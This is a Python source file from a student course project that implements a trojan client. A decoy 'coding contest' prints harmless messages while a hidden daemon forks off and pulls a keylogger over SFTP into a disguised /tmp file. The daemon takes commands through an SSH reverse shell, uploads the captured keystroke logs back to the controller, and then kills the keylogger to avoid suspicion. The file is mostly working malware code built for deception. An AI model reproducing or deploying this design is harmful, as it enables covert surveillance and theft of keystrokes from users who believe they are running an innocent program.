#!/usr/bin/python3

#==============================================================================
 #      Assignment:  DPI912 Term Project
 #      File: SSH Client
 #
 #      Authors: Sang Min Park, Jacky Tea
 #      Student ID (Sang Min Park): 124218173
 #      Student ID (Jacky Tea): 152078168
 #      Language: Python3
 #      Libraries Used: paramiko, socket, os, time, logzero,
 #      threading, subprocess, sys, atexit, signal
 #
 #      To compile with python3 >>> python3 a1SSHClient.py 
 #      To compile with executable >>> chmod 700 a1SSHClient.py
 #                                 >>> ./a1SSHClient.py
 #
 #      Class: DPI912 NSB - Python for Programmers: Sockets and Security 
 #      Professor: Professor Harvey Kaduri
 #      Due Date: Friday, December 6, 2019, 5:50 PM EST
 #      Submitted:  
 #
 #-----------------------------------------------------------------------------
 #
 #      Cookbook code utilized from the following source:
 #      https://github.com/dabeaz/python-cookbook/blob/master/src/12/launching_a_daemon_process_on_unix/daemon.py
 #
 #      Description: A client containing wrapper classes for Paramiko's SSH and SFTP 
 #      functionalities for the purpose of secure data and file tranferring. The main
 #      thread of execution includes a surface process of non-malevolent operations 
 #      diguised as a coding contest that requires execution of this file. A background
 #      malevolent process is executed in tandem that sends commands from a daemon to
 #      be executed on this client via a reverse-shell. 
 #
 #      Input: No command line or user input necessary.
 #
 #      Output: A file called in 'sshClient.log' in the current directory containing
 #      error messages and information such as received messages over the SSH connection.
 #
 #      Algorithm: A non malicious 'coding contest' is started to print arbitrary messages
 #      to the screen, then a malicious daemon is forked off which grabs keylogger file 
 #      contents via SFTP into a file that will be executed via remotely via SSH commands.
 #      The contents of the logs are sent back via SFTP and a SSH command kills the keylogger
 #      remotely as to not arouse any suspicion of background processes.
 #
 #      Required Features Not Included:  
 #
 #      Known Bugs:  
 #
#==============================================================================

import paramiko
import socket
import os
import time
import logzero
from logzero import logger
import threading
import subprocess
import sys
import atexit
import signal
from sshClient import sshClient
from sftpClient import sftpClient


pidfile = "/tmp/client.pid"

# Add logging to logfile and disable output to the terminal
logzero.logfile("/home/lab/bin/py/project/sshClient.log", maxBytes=1e6,
                backupCount=3, disableStderrLogger=True)


def removePidProcess():
    if os.path.exists(pidfile):
        logger.info("Server process killed...\n")
        with open(pidfile) as file:
            pid = int(file.readline().rstrip())
            os.kill(pid, signal.SIGTERM)
    else:
        logger.error("Expected server pidfile not found")


def dropPrivileges(uid=65534, gid=65534):
    """Drops UID and GID privileges if current process has access to root.
    98 is used to set new UID and GID.
    UIDs 1 through 99 are traditionally reserved for special system users (pseudo-users),
    such as wheel, daemon, lp, operator, news, mail, etc.
    Reference: http://www.linfo.org/uid.html"""
    try:
        # If process has access to root ...
        if os.getuid() == 0:
            logger.info("Dropping root access privileges")
        # Setting new UID and GID
            try:
                os.setuid(uid)
            except OSError as e:
                logger.error(f"'Could not set effective user id: {e}")

            try:
                os.setgid(gid)
            except OSError as e:
                logger.error(f"'Could not set effective group id: {e}")
        else:
            # Process has no root access
            logger.info("No root privileges")
    except Exception as e:
        logger.error("Failed to drop privileges: {e}")
        raise Exception(e)


def daemonize(pidfile, *, stdin='/dev/null',
              stdout='/dev/null',
              stderr='/dev/null'):
    """The code below is adapted by:
    https://github.com/dabeaz/python-cookbook/blob/master/
    src/12/launching_a_daemon_process_on_unix/daemon.py
    It uses Unix double-fork magic based on Stevens's book
    "Advanced Programming in the UNIX Environment".
    Creates a daemon that is diassociated with the terminal
    and has no root privileges. Once double-forking is successful
    it writes its pid to a designated pidfile. The pidfile
    is later used to kill the daemon.
    """

    # If pidfile exists, there is a server program that is currently running
    if os.path.exists(pidfile):
        raise RuntimeError('Already running')

    # First fork (detaches from parent)
    try:
        if os.fork() > 0:
            # Parent exit
            raise SystemExit(0)
    except OSError as e:
        raise RuntimeError(f'fork #1 failed: {e}')

    # Decouple from parent environment
    os.chdir('/tmp')
    os.umask(0)
    os.setsid()
    dropPrivileges()

    logger.info("fork#1 successfull")
    # Second fork (relinquish session leadership)
    try:
        if os.fork() > 0:
            raise SystemExit(0)
    except OSError as e:
        raise RuntimeError(f'fork #2 failed: {e}')

    # Flush I/O buffers
    sys.stdout.flush()
    sys.stderr.flush()

    # Replace file descriptors for stdin, stdout, and stderr
    with open(stdin, 'rb', 0) as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open(stdout, 'ab', 0) as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
    with open(stderr, 'ab', 0) as f:
        os.dup2(f.fileno(), sys.stderr.fileno())

    # PID of the double-forked daemon
    fork2DaemonPID = os.getpid()

    logger.info("Writing pidfile")
    # Write the PID file
    with open(pidfile, 'w') as f:
        print(fork2DaemonPID, file=f)

    logger.info(f"fork#2 successful pid[{fork2DaemonPID}]")

    # Arrange to have the PID file removed on exit/signal
    atexit.register(lambda: os.remove(pidfile))
    atexit.register(lambda: removePidProcess())

    # Signal handler for termination (required)
    def sigterm_handler(signo, frame):
        raise SystemExit(1)

    signal.signal(signal.SIGTERM, sigterm_handler)


def getServerPath(ssh):
    try:
        logger.info("[+]    getServerPath() starting")
        ssh.makeSSHConnection()

        ssh.send("path")
        serverCurrentPath = ssh.receive()
        ssh.send(serverCurrentPath.encode())

        ssh.channel.close()
        ssh.sshConnection.close()

        logger.info("[+]    getServerPath() ending")
        return serverCurrentPath
    except subprocess.CalledProcessError as e:
        logger.error(f"Subprocess error: {e.output.decode()}")
    except paramiko.SSHException as sshErr:
        logger.error(f'Shell invoke failed:{sshErr}')
        ssh.sshConnection.close()
    except socket.timeout as toutErr:
        logger.error(f'Connection timed out:{toutErr}')
        ssh.sshConnection.close()
    except Exception as err:
        logger.error(f'Exception has ocurred:{err}')
        ssh.sshConnection.close()


def start(ssh):
    try:
        logger.info("[+]    start() starting")
        ssh.makeSSHConnection()

        ssh.send("start")
        ssh.invokeShell()

        ssh.channel.close()
        ssh.sshConnection.close()
        logger.info("[-]    start() ending")
    except subprocess.CalledProcessError as e:
        logger.error(f"Subprocess error: {e.output.decode()}")
    except paramiko.SSHException as sshErr:
        logger.error(f'Shell invoke failed:{sshErr}')
        ssh.sshConnection.close()
    except socket.timeout as toutErr:
        logger.error(f'Connection timed out:{toutErr}')
        ssh.sshConnection.close()
    except Exception as err:
        logger.error(f'Exception has ocurred:{err}')
        ssh.sshConnection.close()


def stop(ssh):
    logger.info("[+]    stop() thread starting")
    ssh.makeSSHConnection()

    ssh.send("stop")
    ssh.invokeShell()
    ssh.command = "stop"

    logger.info("[-]    stop() thread finishing",)


def makeSocketConnection():
    remotepath = "/keyLogger.py"
    localpath = "/tmp/ZZZZ_NOT_SUSPICIOUS_FILE"
    remotepath2 = "/clientKeyLogs.log"
    localpath2 = "/tmp/keylog.log"

    try:
        daemonize(pidfile, stdout='/tmp/client.pid', stderr='/tmp/client.pid')
        # make password file
        os.system("touch /tmp/ZZZZ_NOT_SUSPICIOUS_FILE")

        ssh = sshClient("localhost", 9000, "rick", "jacky")
        serverCurrentPath = getServerPath(ssh)

        remotepath = serverCurrentPath + remotepath
        remotepath2 = serverCurrentPath + remotepath2
        logger.info(f"remotepath: {remotepath}  | remotepath2: {remotepath2}")

        sftp = sftpClient("localhost", 22, "lab", "lab")
        sftp.downloadFile(remotepath, localpath)

        start(ssh)

        logger.info("Main before creating thread")
        stopThread = threading.Thread(
            target=stop, args=[ssh], daemon=True)
        logger.info("Main before running thread")
        stopThread.start()

        while ssh.command != "stop":
            logger.info("Sleeping . . . ")
            time.sleep(4)
            logger.info(f"Command: {ssh.command}")
            logger.info("Awake!")

        stopThread.join()

        sftp.uploadFile(remotepath2, localpath2)

        # Kill the process id that is located in the pidfile
        if os.path.exists(pidfile):
            logger.info("Server process killed...\n")
            with open(pidfile) as file:
                pid = int(file.readline().rstrip())
                os.kill(pid, signal.SIGTERM)
        else:
            print("Expected server pidfile not found", file=sys.stderr)
            logger.error("Expected server pidfile not found")
            raise SystemExit(1)
    except Exception as e:
        logger.error(f"Error: {e}")
        raise


def runContest():
    # non malicious stuff
    print("Welcome to the DPI Coding Contest!")

    print("For this challenge, you'll be writing a python socket client to communicate to " +
          "a server located at the IP address of '127.0.0.1' and running on port 27000. " +
          "The client must be able to send different types of data." +
          "Your overall implementation will be assessed along with your " +
          "knowledge of networking fundamentals, coding style and program efficiency.")

    print("Run this file as many times as you need to check on the server status and any " +
          "information you need to compplete the contest. " +
          "This is file is used to ping the server.")

    print("Language Used: Python 3, Recommended Libraries to use: os, sys, socket")
    print("Your coding challenge: Send an 'X' to the server with a python" +
          "socket client connection to terminate the server.")
    print("Now let's get coding!")

    print("Pinging server ...")
    for i, j in enumerate(list(range(10001))):
        print(str(i / 100) + " percent complete.", end='\r')
    print("\n")

    try:
        helloSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        helloSocket.connect(("127.0.0.1", 9999))
        helloSocket.settimeout(5.0)
        print(helloSocket.recv(1024).decode())
        helloSocket.send("Hello from contest client!".encode())
        helloSocket.close()
    except Exception:
        print("Woops! Seems like you do not have the server running!" +
              "Use the command 'python3 contestServer.py' to start it up on the" +
              "command Line")
